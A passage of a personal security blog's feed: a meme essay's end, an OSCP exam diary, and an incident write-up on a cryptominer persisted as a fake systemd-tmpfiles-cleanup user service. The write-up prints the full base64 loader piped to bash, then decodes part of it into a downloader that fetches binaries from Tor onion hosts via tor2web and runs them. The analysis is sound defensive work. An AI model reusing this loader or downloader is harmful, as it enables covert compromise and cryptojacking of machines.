class="line">2021.05.08声称台湾是第一个可以看到《速9》的“国家”</span><br><span class="line">2021.05.10发布Bing Chilling视频</span><br><span class="line">2021.05.25发布道歉视频</span><br><span class="line">2021.05.25后John Xina等梗图出现</span><br></pre></td></tr></table></figure><p>信息结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                                                 ----&gt; 台独 ----&gt; 辱华</span><br><span class="line">Ready or Not &lt;---- Bing Chilling &lt;---- John Cena +</span><br><span class="line">                                                 ----&gt; John Xina ----&gt; 辱华</span><br></pre></td></tr></table></figure><p>那么在Bing Chilling本身不辱华的前提下得到Ready or Not辱华<br />则辱华源自于台独以及John Xina</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     辱华    辱华传递    辱华     辱华传递   辱华  ----&gt; 台独 ----&gt; 辱华</span><br><span class="line">Ready or Not &lt;---- Bing Chilling &lt;---- John Cena +</span><br><span class="line">                                                 ----&gt; John Xina ----&gt; 辱华</span><br></pre></td></tr></table></figure><p>辱华传递</p><p>或者说</p><p>模因污染</p><h1 id="番外_2"><a class="markdownIt-Anchor" href="#番外_2"></a> 番外_2</h1><p>如果Bing Chilling这个词语本身就是辱华呢</p><p>这个问题困扰了我一小段时间，我想要知道这个词语在背后所指的含义是什么</p><p>但是只找到两个具体含义：冰淇淋、寒冷</p><p>网上也有对于这个词语的讨论</p><blockquote><p><a href="https://www.reddit.com/r/asianamerican/comments/13syd2a/bing_chilling_is_starting_to_feel_like_the_new/">https://www.reddit.com/r/asianamerican/comments/13syd2a/bing_chilling_is_starting_to_feel_like_the_new/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;Bing Chilling&quot; is starting to feel like the new &quot;Ching Chong&quot;.</span><br><span class="line"></span><br><span class="line">Has anyone else realized this? This phrase has started to appear often on images&#x2F;videos involving ANY East&#x2F;Southeast Asian person, not just someone of Chinese ethnicity. Such comments are highly upvoted and repeated as well, and many find it &quot;funny&quot;. It&#39;s also becoming common outside of Reddit.</span><br><span class="line"></span><br><span class="line">Some Asian schoolchildren? &quot;bing chilling.&quot; Asian products? &quot;bing chilling.&quot; Asian celebrity? &quot;bing chilling.&quot; An Asian looking guy making a video? &quot;bing chilling.&quot; At this point, it feels like the latest dog whistle to normalize racism against Asians, like how is &quot;bing chilling&quot; not the same as &quot;ching chong?&quot; These are both mockeries of the Chinese language used to make fun of Chinese people, and by a wider extension, East and Southeast Asians in general.</span><br><span class="line"></span><br><span class="line">I&#39;ve heard people justify this by claiming it was directed at the Chinese government or John Cena. If so, why are you using it against ANY Chinese or Asian person that they come across, including in a non-political context?</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I feel that. Before it completely took off and became a phrase EVERYONE said, I thought the original videos of John Cena were both amusing yet impressive that he’s trying his best to convey his message in full Mandarin. I liked them!</span><br><span class="line"></span><br><span class="line">This week, I dropped off my students at the school yard, and a random non-Asian kid from another class comes up to me and starts saying Bing Chilling. I thought, okay now this is starting to get weird. What is this kid trying to get out of saying that to me? It’s one thing if I know the context, but if I didn’t, how would I internalize someone saying that to me?</span><br><span class="line"></span><br><span class="line">Definitely feel like it’s heading toward that direction, if it isn’t already. I’m also feeling the same way about Emotional Damage being said by everyone in the accent that one guy does. All of the kids in my school say that too.</span><br></pre></td></tr></table></figure><p>那是否会是以模仿中文发音的形式进行辱华？</p><p>如果模仿中文发音是辱华，那么只要一个人想，他可以模仿中文发音说任何话来进行辱华，而不仅限于&quot;Bing Chilling&quot;</p><blockquote><p><a href="https://www.reddit.com/r/ChineseLanguage/comments/ry7h4w/is_saying_bing_chilling_racist/">https://www.reddit.com/r/ChineseLanguage/comments/ry7h4w/is_saying_bing_chilling_racist/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi guys, is it racist if I learn Chinese (I&#39;m from the UK)? Thanks for the help!</span><br></pre></td></tr></table></figure><p>在我尝试将这个词语在客观上强行和辱华关联而失败之后，我意识到这个词语/Meme是否辱华听者主观上对这个词语的理解</p><p>假设A是中国人，B是外国人</p><table><thead><tr><th>A\B</th><th>Meme</th><th>Racist</th></tr></thead><tbody><tr><td>Meme</td><td>“That’s fun.”</td><td>“That’s fun.”</td></tr><tr><td>Racist</td><td>“Stop it.”</td><td>“Stop it.”</td></tr></tbody></table><p>这里写Racist并不十分恰当，因为Bing Chilling是针对中文发音而不是整个黄色种人，对越南人讲Bing Chilling可能只会被理解为单纯的Meme，称为Language discrimination更为恰当，但是意会即可</p><p>但是如果说是针对中文发音的话，不知非中国的中文使用者是否会认为这个属于歧视？</p><p>这里涉及到共识(Mutual knowledge)<br />当且AB均认为这个词是辱华时，则构成故意辱华<br />如果A认为辱华而B认为是Meme，则构成无意辱华，告诉B自己觉得这个词带有歧视，不喜欢这个Meme即可</p><p>于是乎，某种情况下语言的意义由说者和听者的主观意识决定<br />于是乎，某种情况下信息的意义由发者和收者的主观意识决定</p><h1 id="番外_3"><a class="markdownIt-Anchor" href="#番外_3"></a> 番外_3</h1><blockquote><p><a href="https://www.george-orwell.org/1984/4.html">https://www.george-orwell.org/1984/4.html</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;There is a word in Newspeak,&#39; said Syme, &#39;I don&#39;t know whether you know it: duckspeak, to quack like a duck. It is one of those interesting words that have two contradictory meanings. Applied to an opponent, it is abuse, applied to someone you agree with, it is praise.&#39;</span><br></pre></td></tr></table></figure><p>某种情况下信息的意义并不由发者与收者的主观意识决定，而是由被描述的对象所决定</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;抽象日志：逆模因&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
  <entry>
    <title>OSCP</title>
    <link href="https://yoloyolo.top/2023/08/21/OSCP/"/>
    <id>https://yoloyolo.top/2023/08/21/OSCP/</id>
    <published>2023-08-21T11:15:26.000Z</published>
    <updated>2023-08-23T11:52:12.669Z</updated>
    
    <content type="html"><![CDATA[<p>除了写报告有点折磨人其他都挺简单的</p><a id="more"></a><h1 id="前期准备"><a class="markdownIt-Anchor" href="#前期准备"></a> 前期准备</h1><p><a href="https://www.hackthebox.com/">https://www.hackthebox.com/</a></p><p>HTB没必要开会员，能上个Pro Hacker段差不多可以了</p><p>没思路可以上BreachForum看别人的交流</p><p>虽说BreachForum之前被FBI拿下了，但好像又有个新的出来了</p><p><a href="https://tryhackme.com/path/outline/pentesting">https://tryhackme.com/path/outline/pentesting</a></p><p>THM那个Offensive Pentesting课程还可以，刷信用卡一个月会员六七十人民币左右，一个月会员的时间正好差不多打完吧</p><p>当然是边工作边打的</p><p>会员记得取消订阅，不然下个月接着扣费，虽然说可以写小作文发邮件退回来</p><p><a href="https://vulnhub.com/">https://vulnhub.com/</a></p><p>20年那会儿疫情蹲家里的时候打得多，本来打算打个三四十台准备去报名OSCP的</p><p>结果不让办护照，23年放开了能办护照了这才报名的OSCP</p><h1 id="报名"><a class="markdownIt-Anchor" href="#报名"></a> 报名</h1><p>在官方报了</p><p>然后说谷安那边有优惠</p><p>看了一下能便宜2k</p><p>直接把官方的退款了然后在谷安报名</p><h1 id="课程学习"><a class="markdownIt-Anchor" href="#课程学习"></a> 课程学习</h1><p>有上述前期准备的话课程的练习半个月就能弄完</p><p>LAB基本上是一周能打一组，LAB3好像花了两周来着，记得不是很清楚</p><p>剩下一个月订阅个PG（记得取消下一个月的订阅），工作日打PG保持手感，周末重新打模拟考试</p><p>PG优先打Pratice，有的时候能上班打一台，下班回去打一台</p><p>有时候懒得打下班都不想打</p><p>打到最后差不多一个月打了26台好像</p><p>拿10分奖励分能让考试压力小不少，虽说最后也不缺这10分</p><h1 id="考试准备"><a class="markdownIt-Anchor" href="#考试准备"></a> 考试准备</h1><h2 id="摄像头"><a class="markdownIt-Anchor" href="#摄像头"></a> 摄像头</h2><p>摄像头买个十几块720P差不多得了（台式机）</p><p>考试时间前的15分钟会让你出示证件，然后看房间一周，最后看桌子底下</p><h2 id="网络"><a class="markdownIt-Anchor" href="#网络"></a> 网络</h2><p>关于网络，可以事先开一台阿里云的抢占式实例，香港节点，2核2G，带宽拉满，流量计费</p><p>搭IPSEC代理，装个openvpn，然后连考试的VPN，本地虚拟机连上IPSEC代理就能通考试环境的VPN</p><p><a href="https://github.com/hwdsl2/setup-ipsec-vpn">https://github.com/hwdsl2/setup-ipsec-vpn</a></p><p>实际使用时需要在云主机配一下iptables</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">iptables -t nat -A POSTROUTING -s 192.168.42.0&#x2F;24 -j MASQUERADE</span><br></pre></td></tr></table></figure><p>命令应该是这样来着？</p><p>这玩意拿来做LAB挺爽的，传文件跟反弹Shell就不是很方便了</p><p>虽说实际考试的时候网络挺好的</p><p>事先开的阿里云没用上，而且忘了关了，不是写这篇blog我都想不起来自己准备了一台云主机，放了50小时才扣十几块</p><h2 id="食物"><a class="markdownIt-Anchor" href="#食物"></a> 食物</h2><p>随便整点零食小面包就行</p><p>吃了包辣条冲了三次</p><p>给自己上点强度了属于是</p><p>贤哥红烧素鱼片我劝你少吃</p><h1 id="考试过程"><a class="markdownIt-Anchor" href="#考试过程"></a> 考试过程</h1><p>下午三点开始</p><p>域纯白给，两小时拿下</p><p>两台机器GetShell不难，提权有点偏</p><p>也算运气好，自己慢慢找也找出来了</p><p>找到第一个提权的时候已经差不多花了六个小时</p><p>拿下70分就开始写报告了</p><p>写了三个多小时把主要内容写得差不多了</p><p>这时候san值挺低了</p><p>然后开始看第二个机器的提权，强行跳出之前自己掉进去的兔子洞（思路钻牛角尖）之后找到了正确的提权方法</p><p>跟监考说一声就上个厕所洗把脸睡了</p><p>san值低的情况下做的梦很奇怪</p><p>梦到了最后一台机器的GetShell方法，但是自己又有点清醒，知道这个方法是错的</p><p>总之睡得很不好</p><p>定个五个小时闹钟，醒来感觉不太够，继续躺下补40分钟</p><p>起来先把报告弄完</p><p>最后一台机器枚举一个多小时找不到落脚点懒得找了</p><p>但是又有种这台机器的GetShell方法是一种比较怪的方法，然后提权特别容易的感觉</p><p>把报告内容跟平台提交的flag检查一下就交报告了</p><p>分数应该是域控40+两台独立机器40+奖励10</p><h2 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h2><p>考试是周日中午结束的，考试结果是周一下午一点收到的</p><p>26个小时的样子，这效率挺高的</p><p>OSCP考的核心就是信息收集，收集得明白能找到对应利用方法就能过</p><p>后续该准备那个桌面运维岗位的招聘需求了</p><ul><li>SCCM</li><li>CCNA</li><li>英语口语</li></ul><p>其他一些打算</p><ul><li>CRTO</li><li>CRTO II</li></ul><p>OSEP跟OSWE放CRTO之后再考虑吧</p><p>感觉CRTO作为OSEP前置考挺不错的</p><p>主要是这玩意一个9k确实有点贵了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;除了写报告有点折磨人其他都挺简单的&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="OSCP" scheme="https://yoloyolo.top/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>ESo1YS_Miner_Analysis</title>
    <link href="https://yoloyolo.top/2023/07/18/ESo1YS-Miner-Analysis/"/>
    <id>https://yoloyolo.top/2023/07/18/ESo1YS-Miner-Analysis/</id>
    <published>2023-07-18T10:56:49.000Z</published>
    <updated>2023-07-19T12:08:25.787Z</updated>
    
    <content type="html"><![CDATA[<p>给枯燥的工作平添一分不确定性罢了</p><a id="more"></a><h1 id="失陷"><a class="markdownIt-Anchor" href="#失陷"></a> 失陷</h1><p>temper monkey脚本写得正开心, 切到虚拟机一看右上角cpu跑满了<br />top一看cpu跑到170了都, 基本就是挖矿了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                       </span><br><span class="line">34967 root      20   0 2438752   8308      4 S 176.1   0.2 143:44.29 qMubU9A</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | grep 34967</span><br><span class="line">tcp        0      0 172.31.130.144:54302    89.223.120.251:9090     ESTABLISHED 34967&#x2F;qMubU9A</span><br></pre></td></tr></table></figure><p>IP丢到微步看了下确定是公共矿池</p><h1 id="溯源"><a class="markdownIt-Anchor" href="#溯源"></a> 溯源</h1><p>虚拟机就开了个ssh, root还是弱口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;log&#x2F;auth.log | grep Accept</span><br><span class="line">Jul 16 11:35:40 localhost sshd[1183603]: Accepted password for root from 172.31.134.56 port 41378 ssh2</span><br></pre></td></tr></table></figure><p>果然</p><p>nmap扫了一下这个IP, 开的端口还挺多, 不知道是谁的服务器<br />跟网管反馈了下也是爱答不理<br />无所谓了, 把自己手上这个挖矿程序处理掉就行<br />正好最近项目要一点恶意程序, 直接把/proc/pid/exe拉出来丢给同事了<br />笑死</p><h1 id="维持"><a class="markdownIt-Anchor" href="#维持"></a> 维持</h1><p>本来还以为是会写个计划任务, 看到后面发现是服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps axo pid,ppid,comm | grep 34967</span><br><span class="line">  34967     531 qMubU9A</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ps axo pid,ppid,comm | grep 531  </span><br><span class="line">    531       1 systemd</span><br><span class="line">    534     531 (sd-pam)</span><br><span class="line">    682     531 dbus-daemon</span><br><span class="line">    991     531 gnome-keyring-d</span><br><span class="line">   1096     531 at-spi-bus-laun</span><br><span class="line">   1108     531 xfconfd</span><br><span class="line">   1114     531 at-spi2-registr</span><br><span class="line">   1126     531 gpg-agent</span><br><span class="line">   1132     531 gvfsd</span><br><span class="line">   1138     531 gvfsd-fuse</span><br><span class="line">   1233     531 pulseaudio</span><br><span class="line">   1234     531 xfce4-notifyd</span><br><span class="line">   1288     531 dconf-service</span><br><span class="line">   1344     531 gvfs-udisks2-vo</span><br><span class="line">   1413     531 gvfs-afc-volume</span><br><span class="line">   1419     531 gvfs-mtp-volume</span><br><span class="line">   1424     531 gvfs-gphoto2-vo</span><br><span class="line">   1433     531 gvfs-goa-volume</span><br><span class="line">   1458     531 gvfsd-metadata</span><br><span class="line">   1476     531 obexd</span><br><span class="line">   1691     531 FOe1wQ9</span><br><span class="line">  34967     531 qMubU9A</span><br><span class="line">  54540     531 JxM0JUD</span><br></pre></td></tr></table></figure><p>基本就是后面三个程序有问题了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">systemctl status | grep -C 5 FOe1wQ9</span><br><span class="line"></span><br><span class="line">                 │ ├─systemd-tmpfiles-cleanup.service</span><br><span class="line">                 │ │ ├─ 1691 FOe1wQ9</span><br><span class="line">                 │ │ ├─34967 qMubU9A</span><br><span class="line">                 │ │ └─54540 JxM0JUD</span><br></pre></td></tr></table></figure><p>定位到服务位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">locate systemd-tmpfiles-cleanup</span><br><span class="line">&#x2F;root&#x2F;.config&#x2F;systemd&#x2F;user&#x2F;systemd-tmpfiles-cleanup</span><br><span class="line">&#x2F;root&#x2F;.config&#x2F;systemd&#x2F;user&#x2F;systemd-tmpfiles-cleanup.service</span><br><span class="line">&#x2F;root&#x2F;.config&#x2F;systemd&#x2F;user&#x2F;systemd-tmpfiles-cleanup.timer</span><br><span class="line">&#x2F;root&#x2F;.config&#x2F;systemd&#x2F;user&#x2F;timers.target.wants&#x2F;systemd-tmpfiles-cleanup.timer</span><br><span class="line">&#x2F;root&#x2F;.local&#x2F;share&#x2F;systemd&#x2F;timers&#x2F;stamp-systemd-tmpfiles-cleanup.timer</span><br></pre></td></tr></table></figure><p>看下路径结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tree &#x2F;root&#x2F;.config&#x2F;systemd&#x2F;user </span><br><span class="line">&#x2F;root&#x2F;.config&#x2F;systemd&#x2F;user</span><br><span class="line">├── systemd-tmpfiles-cleanup</span><br><span class="line">├── systemd-tmpfiles-cleanup.service</span><br><span class="line">├── systemd-tmpfiles-cleanup.timer</span><br><span class="line">└── timers.target.wants</span><br><span class="line">    └── systemd-tmpfiles-cleanup.timer -&gt; &#x2F;root&#x2F;.config&#x2F;systemd&#x2F;user&#x2F;systemd-tmpfiles-cleanup.timer</span><br></pre></td></tr></table></figure><p>每小时运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat systemd-tmpfiles-cleanup.timer  </span><br><span class="line">[Unit]</span><br><span class="line">Description&#x3D;Cleanup of User&#39;s Temporary Files</span><br><span class="line">[Timer]</span><br><span class="line">OnCalendar&#x3D;hourly</span><br><span class="line">Persistent&#x3D;true</span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;timers.target</span><br></pre></td></tr></table></figure><p>维持运行程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;.config&#x2F;systemd&#x2F;user&#x2F;systemd-tmpfiles-cleanup.service</span><br><span class="line">[Unit]</span><br><span class="line">Description&#x3D;Cleanup of User&#39;s Temporary Files</span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;forking</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;bash -c &quot;exec &amp;&gt;&#x2F;dev&#x2F;null;echo ESo1YS;echo RVNvMVlTCmV4ZWMgJj4vZGV2L251bGwKZXd2QkJlQ209Li8uJChkYXRlfG1kNXN1bXxoZWFkIC1jMjApCnFkbm1DdUZlPShkb2gtY2guYmxhaGRucy5jb20gZG9oLWRlLmJsYWhkbnMuY29tIGRvaC1qcC5ibGFoZG5zLmNvbSBkb2gtc2cuYmxhaGRucy5jb20gZG9oLmxpIGRvaC5wdWIgZG9oLmRucy5zYiBkbnMudHduaWMudHcpCmZ1V3RPY1RUPSIvdG1wL3N5c3RlbWQtcHJpdmF0ZS1hMTNiNTBiYTgzYmNjMzY3OTc5NWZlYzJmMTA2ZDAyZS1zeXN0ZW1kLWxvZ2luZC5zZXJ2aWNlLUVTbzFZUyIKa3pLWXBCVnI9ImN1cmwgLW02MCAtZnNTTGtBLSAtLWRvaC11cmwgaHR0cHM6Ly8ke3Fkbm1DdUZlWyQoKFJBTkRPTSUkeyNxZG5tQ3VGZVtAXX0pKV19L2Rucy1xdWVyeSIKektqSmtWV0Y9ImN1cmwgLW02MCAtZnNTTGtBLSIKY1ZYZnVWWm89InJlbGF5LnRvcjJzb2Nrcy5pbiIKdkJaakdNeEY9InJ1NnI0aW5rYWY0dGhsZ2ZsZzRpcXM1bWhxd3F1Ym9sczVxYWdzcHZ5YTR3aHAzZGdidm15aGFkIgpQQVRIPS90bXA6JGZ1V3RPY1RUOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjokUEFUSAoKU3JUbElNa1QoKSB7CglyZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCglET0M9LyR7cGF0aC8vIC8vfQoJSE9TVD0ke3NlcnZlci8vOip9CglQT1JUPSR7c2VydmVyLy8qOn0KCVtbIHgiJHtIT1NUfSIgPT0geCIke1BPUlR9IiBdXSAmJiBQT1JUPTgwCglleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKCWVjaG8gLWVuICJHRVQgJHtET0N9IEhUVFAvMS4wXHJcblVzZXItQWdlbnQ6IC1cclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKCSh3aGlsZSByZWFkIGxpbmU7IGRvCglbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCglkb25lICYmIGNhdCkgPCYzCglleGVjIDM+Ji0KfQoKSXZaWnlvWXMoKSB7Cglmb3IgaSBpbiAkZnVXdE9jVFQgLiAvdXNyL2JpbiAvdmFyL3RtcCAvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9CgpzbWhnY1FYUygpIHsKCWdKaWJ3TXBCPS9leGVjCglKek5aeWdXTT1jcjBfJChjdXJsIC00IGlkZW50Lm1lfHxjdXJsIC00IGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbilfJCh1bmFtZSAtcilfJChjYXQgL2V0Yy9tYWNoaW5lLWlkfHwoaXAgcnx8aG9zdG5hbWUgLWl8fGVjaG8gbm8taWQpfG1kNXN1bXxhd2sgTkY9MSkKCSRrektZcEJWciAteCBzb2NrczVoOi8vJGNWWGZ1VlpvOjkwNTAgLWUkSnpOWnlnV00gJHZCWmpHTXhGLm9uaW9uJGdKaWJ3TXBCIC1vJGV3dkJCZUNtIHx8ICRrektZcEJWciAtZSRKek5aeWdXTSAkMSRnSmlid01wQiAtbyRld3ZCQmVDbSB8fCAkektqSmtWV0YgLXggc29ja3M1aDovLyRjVlhmdVZabzo5MDUwIC1lJEp6Tlp5Z1dNICR2QlpqR014Ri5vbmlvbiRnSmlid01wQiAtbyRld3ZCQmVDbSB8fCAkektqSmtWV0YgLWUkSnpOWnlnV00gJDEkZ0ppYndNcEIgLW8kZXd2QkJlQ20KfQoKbVlWZVRMRFAoKSB7CgljaG1vZCAreCAkZXd2QkJlQ207JGV3dkJCZUNtO3JtIC1mICRld3ZCQmVDbQp9CgpCcE5SS0RlWSgpIHsKCXU9JHZCWmpHTXhGLnRvcjJ3ZWIuaXQvbG9hZC8KCWNkIC90bXAgJiYgY3VybCAtViB8fCAoU3JUbElNa1QgaHR0cDovLyR1L2N1KSB8IHRhciB6eHAKCUl2Wlp5b1lzCglzbWhnY1FYUyAkdkJaakdNeEYudG9yMndlYi5pdCB8fAoJc21oZ2NRWFMgJHZCWmpHTXhGLnRvcjJ3ZWIuaW4gfHwKCXNtaGdjUVhTICR2QlpqR014Ri50b3Iyd2ViLnJlCgltWVZlVExEUAp9CgpscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uc3lzdGVtZC4xKS9tYXBzIHx8IEJwTlJLRGVZCg&#x3D;&#x3D;|base64 -d|bash&quot;</span><br><span class="line">WorkingDirectory&#x3D;~</span><br></pre></td></tr></table></figure><h1 id="downloader"><a class="markdownIt-Anchor" href="#downloader"></a> Downloader</h1><p>解码结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">ESo1YS</span><br><span class="line">exec &amp;&gt;&#x2F;dev&#x2F;null</span><br><span class="line">ewvBBeCm&#x3D;.&#x2F;.$(date|md5sum|head -c20) # filename</span><br><span class="line">qdnmCuFe&#x3D;(doh-ch.blahdns.com doh-de.blahdns.com doh-jp.blahdns.com doh-sg.blahdns.com doh.li doh.pub doh.dns.sb dns.twnic.tw)</span><br><span class="line">fuWtOcTT&#x3D;&quot;&#x2F;tmp&#x2F;systemd-private-a13b50ba83bcc3679795fec2f106d02e-systemd-logind.service-ESo1YS&quot;</span><br><span class="line">kzKYpBVr&#x3D;&quot;curl -m60 -fsSLkA- --doh-url https:&#x2F;&#x2F;$&#123;qdnmCuFe[$((RANDOM%$&#123;#qdnmCuFe[@]&#125;))]&#125;&#x2F;dns-query&quot; # dns over https</span><br><span class="line">zKjJkVWF&#x3D;&quot;curl -m60 -fsSLkA-&quot; # curl</span><br><span class="line">cVXfuVZo&#x3D;&quot;relay.tor2socks.in&quot; # proxy</span><br><span class="line">vBZjGMxF&#x3D;&quot;ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad&quot;</span><br><span class="line">PATH&#x3D;&#x2F;tmp:$fuWtOcTT:$HOME:&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:$PATH</span><br><span class="line"></span><br><span class="line">SrTlIMkT() &#123;</span><br><span class="line">read proto server path &lt;&lt;&lt;$(echo $&#123;1&#x2F;&#x2F;&#x2F;&#x2F; &#125;)</span><br><span class="line">DOC&#x3D;&#x2F;$&#123;path&#x2F;&#x2F; &#x2F;&#x2F;&#125;  # &#x2F;load&#x2F;cu</span><br><span class="line">HOST&#x3D;$&#123;server&#x2F;&#x2F;:*&#125; # ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.it</span><br><span class="line">PORT&#x3D;$&#123;server&#x2F;&#x2F;*:&#125; # ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.it</span><br><span class="line">[[ x&quot;$&#123;HOST&#125;&quot; &#x3D;&#x3D; x&quot;$&#123;PORT&#125;&quot; ]] &amp;&amp; PORT&#x3D;80</span><br><span class="line">exec 3&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;$&#123;HOST&#125;&#x2F;$PORT # Open TCP Socket ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.tor2web.it:80</span><br><span class="line">echo -en &quot;GET $&#123;DOC&#125; HTTP&#x2F;1.0\r\nUser-Agent: -\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot; &gt;&amp;3 # HTTP Request</span><br><span class="line">(while read line; do</span><br><span class="line">[[ &quot;$line&quot; &#x3D;&#x3D; $&#39;\r&#39; ]] &amp;&amp; break</span><br><span class="line">done &amp;&amp; cat) &lt;&amp;3 # Download curl</span><br><span class="line">exec 3&gt;&amp;- # Close TCP Socket</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IvZZyoYs() &#123;</span><br><span class="line">for i in $fuWtOcTT . &#x2F;usr&#x2F;bin &#x2F;var&#x2F;tmp &#x2F;tmp ;do echo exit &gt; $i&#x2F;i &amp;&amp; chmod +x $i&#x2F;i &amp;&amp; cd $i 